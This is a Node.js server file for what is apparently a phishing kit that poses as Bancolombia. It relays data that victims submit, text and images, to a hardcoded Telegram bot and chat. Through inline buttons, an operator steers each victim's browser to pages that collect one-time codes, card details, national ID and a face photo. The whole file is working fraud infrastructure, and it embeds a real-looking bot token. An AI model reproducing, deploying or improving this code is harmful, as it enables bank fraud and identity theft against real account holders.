const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// Configuración
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = '8132133334:AAGzAzqNvn7N5V_74NU5SwGvJwkJwb2Sd2c';
const TELEGRAM_CHAT_ID = '-4997787461';

// Inicializar bot de Telegram
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Servir archivos estáticos
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' }));

// Almacenar sesiones activas
const activeSessions = new Map();
const sessionSockets = new Map();

// Manejar favicon
app.get('/favicon.ico', (req, res) => {
    res.status(204).end();
});

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Configuración de Socket.IO con mejor logging
io.on('connection', (socket) => {
    console.log('\n🔗 Cliente conectado:', socket.id);
    console.log('   Tiempo:', new Date().toLocaleTimeString());

    // Inicializar sesión
    socket.on('initSession', (data) => {
        const { sessionId, page } = data;
        console.log('Sesión inicializada:', sessionId, 'en página:', page);
        
        activeSessions.set(sessionId, {
            socketId: socket.id,
            page: page || 'unknown',
            timestamp: Date.now()
        });
        
        sessionSockets.set(socket.id, sessionId);
        
        socket.emit('sessionConfirmed', { sessionId, success: true });
    });

    // Mantener sesión activa
    socket.on('keepAlive', (data) => {
        const { sessionId } = data;
        if (sessionId && activeSessions.has(sessionId)) {
            const session = activeSessions.get(sessionId);
            session.timestamp = Date.now();
            activeSessions.set(sessionId, session);
        }
    });

    // Enviar datos a Telegram
    socket.on('sendData', async (data) => {
        try {
            const { type, sessionId, content, waitForAction } = data;
            console.log('\n📨 Datos recibidos del cliente:');
            console.log('   Tipo:', type);
            console.log('   Sesión:', sessionId);
            console.log('   Socket ID:', socket.id);
            console.log('   Contenido:', content.text ? content.text.substring(0, 50) + '...' : 'Imagen');

            // Preparar mensaje y teclado
            let message = content.text || '';
            let keyboard = {
                inline_keyboard: [
                    [
                        { text: "🏠 Index", callback_data: `action:index:${sessionId}` },
                        { text: "🔐 Dinámica", callback_data: `action:dinamica:${sessionId}` }
                    ],
                    [
                        { text: "📄 Términos", callback_data: `action:terminos:${sessionId}` },
                        { text: "💳 Tarjeta", callback_data: `action:tarjeta:${sessionId}` }
                    ],
                    [
                        { text: "🪪 Cédula", callback_data: `action:cedula:${sessionId}` },
                        { text: "👤 Cara", callback_data: `action:cara:${sessionId}` }
                    ],
                    [
                        { text: "✅ Finalizar", callback_data: `action:finalizar:${sessionId}` }
                    ]
                ]
            };

            console.log('📤 Enviando a Telegram...');

            // Enviar mensaje a Telegram
            let telegramResponse;
            if (content.image) {
                // Si hay imagen, enviarla
                console.log('   📷 Enviando imagen con caption');
                const imageBuffer = Buffer.from(content.image.split(',')[1], 'base64');
                telegramResponse = await bot.sendPhoto(TELEGRAM_CHAT_ID, imageBuffer, {
                    caption: message,
                    reply_markup: keyboard
                });
            } else {
                // Solo texto
                console.log('   💬 Enviando mensaje de texto');
                telegramResponse = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
                    reply_markup: keyboard,
                    parse_mode: 'HTML'
                });
            }

            console.log('✅ Mensaje enviado a Telegram exitosamente');
            console.log('   Message ID:', telegramResponse.message_id);

            socket.emit('dataSent', { 
                success: true, 
                type,
                message: 'Datos enviados correctamente a Telegram',
                telegramMessageId: telegramResponse.message_id
            });

        } catch (error) {
            console.error('❌ Error al enviar datos a Telegram:', error);
            console.error('   Error details:', error.message);
            socket.emit('dataSent', { 
                success: false, 
                message: error.message 
            });
        }
    });

    // Manejar desconexión
    socket.on('disconnect', () => {
        console.log('Cliente desconectado:', socket.id);
        
        const sessionId = sessionSockets.get(socket.id);
        if (sessionId) {
            sessionSockets.delete(socket.id);
            
            // No eliminar la sesión inmediatamente, darle tiempo para reconectar
            setTimeout(() => {
                if (activeSessions.has(sessionId)) {
                    const session = activeSessions.get(sessionId);
                    if (session.socketId === socket.id) {
                        console.log('Sesión expirada:', sessionId);
                        activeSessions.delete(sessionId);
                    }
                }
            }, 30000); // 30 segundos para reconectar
        }
    });

    // Confirmar acción recibida
    socket.on('actionReceived', (data) => {
        console.log('Acción confirmada por cliente:', data);
    });
});

// Manejar callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;

    try {
        // Responder al callback inmediatamente
        await bot.answerCallbackQuery(callbackQuery.id);

        // Parsear datos
        const [type, action, sessionId] = data.split(':');

        if (type === 'action' && sessionId) {
            console.log('Acción de Telegram:', action, 'para sesión:', sessionId);

            // Buscar sesión activa
            const session = activeSessions.get(sessionId);
            
            if (session) {
                const socketId = session.socketId;
                const targetSocket = io.sockets.sockets.get(socketId);

                if (targetSocket) {
                    // Enviar acción al cliente
                    targetSocket.emit('telegramAction', {
                        action,
                        sessionId,
                        fromTelegram: true,
                        telegramMessageId: message.message_id,
                        messageId: message.message_id,
                        timestamp: Date.now()
                    });

                    // Confirmar en Telegram
                    await bot.sendMessage(
                        TELEGRAM_CHAT_ID,
                        `✅ Acción "${action}" enviada correctamente`,
                        { reply_to_message_id: message.message_id }
                    );
                } else {
                    await bot.sendMessage(
                        TELEGRAM_CHAT_ID,
                        `⚠️ Cliente desconectado. Socket no encontrado.`,
                        { reply_to_message_id: message.message_id }
                    );
                }
            } else {
                await bot.sendMessage(
                    TELEGRAM_CHAT_ID,
                    `⚠️ Sesión no encontrada o expirada: ${sessionId}`,
                    { reply_to_message_id: message.message_id }
                );
            }
        }
    } catch (error) {
        console.error('Error manejando callback:', error);
        await bot.sendMessage(
            TELEGRAM_CHAT_ID,
            `❌ Error: ${error.message}`,
            { reply_to_message_id: message.message_id }
        );
    }
});

// Limpiar sesiones expiradas cada 5 minutos
setInterval(() => {
    const now = Date.now();
    const EXPIRY_TIME = 30 * 60 * 1000; // 30 minutos

    for (const [sessionId, session] of activeSessions.entries()) {
        if (now - session.timestamp > EXPIRY_TIME) {
            console.log('Limpiando sesión expirada:', sessionId);
            activeSessions.delete(sessionId);
            sessionSockets.delete(session.socketId);
        }
    }
}, 5 * 60 * 1000);

// Manejo de errores del bot
bot.on('polling_error', (error) => {
    console.error('Error de polling de Telegram:', error);
});

// Iniciar servidor
http.listen(PORT, () => {
    console.log('\n' + '='.repeat(50));
    console.log('🚀 Servidor Bancolombia Iniciado');
    console.log('='.repeat(50));
    console.log(`📍 URL: http://localhost:${PORT}`);
    console.log(`🤖 Bot de Telegram: ✅ Conectado`);
    console.log(`👥 Sesiones activas: ${activeSessions.size}`);
    console.log('='.repeat(50) + '\n');
});

// Manejo de cierre graceful
process.on('SIGTERM', () => {
    console.log('SIGTERM recibido, cerrando servidor...');
    http.close(() => {
        console.log('Servidor cerrado');
        process.exit(0);
    });
});
